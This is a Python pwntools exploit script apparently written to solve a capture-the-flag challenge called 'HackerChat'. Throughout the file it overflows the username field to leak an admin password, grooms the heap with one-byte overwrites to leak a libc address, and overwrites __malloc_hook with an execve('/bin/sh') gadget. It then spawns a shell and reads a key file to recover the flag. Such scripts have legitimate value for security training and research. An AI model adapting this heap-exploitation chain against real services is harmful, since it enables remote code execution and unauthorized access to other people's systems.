#!/usr/bin/python2.7

"""
Exploit for HackerChat

6062bdab4760f2026afb1245d43fea6b  hackerChat
cbdbf6e2bea8d490dee24fff5140729e  libc.so.6
"""

from pwn import *
from time import sleep


conn = remote("localhost", 1337)
# conn = remote("10.113.109.158", 1337)	# Service not working yet. Use docker provided image.


def leak_password():
    log.info("leak_password()")

    conn.recvuntil("Username: ")
    junk = 'A' * 32
    conn.sendline(junk)

    output = conn.recvline()
    output = re.findall(junk + "(\\S+)", output)[0]
    return output


def login(username, password):
    conn.recvuntil("Username: ")
    conn.sendline(username)
    conn.recvuntil("Password: ")
    conn.sendline(password)
    conn.recvuntil("4 - logout.\n")

    log.success("login({}:{})".format(username, password))


def send_msg(msg):
    log.info("send_msg(\"{}..\") = {:#x}".format(msg[:8], len(msg)))

    conn.sendline('2')
    sleep(0.25)
    conn.send_raw(msg)
    conn.recvuntil("4 - logout.\n")


def delete_msg(n):
    log.info("delete_msg({})".format(n))

    conn.sendline('3')
    sleep(0.25)
    conn.sendline(str(n))
    conn.recvuntil("4 - logout.\n")


def read_msg(password='\n'):
    log.info("read_msg()")

    conn.sendline('1')
    conn.recvuntil("Please give me password for decrypting chat: ")
    conn.sendline(password)
    x = conn.recvuntil("What do you want to do?\n", drop=True)
    conn.recvuntil("4 - logout.\n")
    return x


def leak_libc():
    send_msg('A' * 0xf8)
    send_msg('B' * 0x68)
    send_msg('C' * 0xf8)
    send_msg('D' * 0x10)

    delete_msg(0)
    delete_msg(0)

    send_msg('E' * 0x68)
    for i in xrange(0x66, 0x5f, -1):
        delete_msg(2)
        send_msg('F' * i + '\x70\x01')

    delete_msg(0)
    send_msg('G' * 0xf7)

    output = read_msg()
    result = re.split("Message \\d: ", output)[2]

    # cleanup
    for i in xrange(0xfd, 0xf7, -1):
        delete_msg(2)
        send_msg('H' * i + '\x70')

    delete_msg(2)
    delete_msg(1)

    return result


def write_hook(hook, value, n):
    send_msg('I' * 0x100 + pack(hook - n, 64))

    for i in xrange(0xfe, 0xf7, -1):
        delete_msg(1)
        send_msg('J' * i + '\x70')

    send_msg('K' * 0x68)
    send_msg('A' * (n - 0x10) + pack(value, 64) + 'D' * (0x68 - n))


def trigger():
    conn.sendline('2')
    sleep(0.25)
    conn.sendline("trigger")
    conn.recvuntil("Write message: ")


if __name__ == '__main__':
    password = leak_password()
    login("admin", password)

    libc_offset = 0x19eb20 + 88  # = main_arena - libc_base - bin_offset
    libc_leak = leak_libc()
    libc_leak = unpack(libc_leak + (8-len(libc_leak))*'\x00', 64)
    libc_base = libc_leak - libc_offset
    log.success("libc_base: {:#08x}".format(libc_base))

    write_hook(
        hook=libc_base + 0x19eb10,  # __malloc_hook
        value=libc_base + 0x408c2,  # execve("/bin/sh", rsp + 0x30, environ)
        n=0x23                      # nearest valid address for fake chunk (size & flags)
    )

    trigger()

    conn.sendline("cat k@q.k")
    key = conn.recv().replace('\x00', '')
    log.success("Key: {}".format(key))

    conn.sendline("./hackerChat")
    login("admin", password)

    output = read_msg(key)
    flag = re.findall("flag{\\S+\\}", output)[0]
    log.success("Flag: {}".format(flag))
